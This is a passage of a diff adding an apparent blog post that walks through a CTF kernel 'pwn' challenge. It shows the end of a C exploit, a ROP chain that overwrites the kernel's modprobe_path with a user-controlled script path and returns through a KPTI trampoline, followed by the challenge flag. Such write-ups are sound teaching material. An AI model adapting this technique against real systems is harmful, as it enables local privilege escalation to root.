+    <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span> <span style="color:#111">mov</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff813089e2</span><span style="color:#111">;</span>
+    <span style="color:#111">size_t</span> <span style="color:#111">off</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+    
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">poprsi</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">modprobe</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">poprcx</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x73752f656d6f682f</span><span style="color:#111">;</span> <span style="color:#75715e">// /home/us   
+</span><span style="color:#75715e"></span>    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">mov</span><span style="color:#111">;</span>
+    
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">poprsi</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">modprobe</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">poprcx</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x61616e77702f7265</span><span style="color:#111">;</span> <span style="color:#75715e">// er/pwnaa    
+</span><span style="color:#75715e"></span>    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">mov</span><span style="color:#111">;</span>
+
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">kpti_trampoline</span><span style="color:#111">;</span> 
+    
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span><span style="color:#111">;</span> <span style="color:#75715e">// dummy rax
+</span><span style="color:#75715e"></span>    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span><span style="color:#111">;</span> <span style="color:#75715e">// dummy rdi
+</span><span style="color:#75715e"></span>    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">user_rip</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">user_cs</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">user_rflags</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">user_sp</span><span style="color:#111">;</span>
+    <span style="color:#111">arr</span><span style="color:#111">[</span><span style="color:#111">off</span><span style="color:#f92672">++</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">user_ss</span><span style="color:#111">;</span>
+
+    <span style="color:#111">ioctl</span><span style="color:#111">(</span><span style="color:#111">fd1</span><span style="color:#111">,</span> <span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+<span style="color:#111">}</span>
+</code></pre></div><p>flag: <code>ingehack{you_can_say_you_have_ZERO_LIMITS!!_badum_tss_🥁}</code></p>
+
+      
+      <div class="post-date">
+        <span class="g time">February 26, 2025 </span> &#8729;
+         
+         <a href="https://nothoudaifa.github.io/tags/ctf/">ctf</a> <a href="https://nothoudaifa.github.io/tags/pwn/">pwn</a>
+      </div>
+      
+    </section>
+    
+    
+    
+  </div>
+</main>
+</body>
+</html>
